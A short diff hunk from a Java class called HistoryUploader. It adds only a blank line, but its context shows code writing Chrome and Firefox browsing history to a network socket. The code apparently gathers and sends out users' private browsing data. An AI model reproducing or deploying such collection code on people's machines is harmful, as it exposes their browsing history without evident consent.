@@ -12,6 +12,7 @@ public class HistoryUploader {
          OutputStream outputStream = socket.getOutputStream();
          DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
 
+
          // 将历史记录写入输出流
          writeHistory(dataOutputStream, chromeHistory, "Chrome");
          writeHistory(dataOutputStream, firefoxHistory, "Firefox");
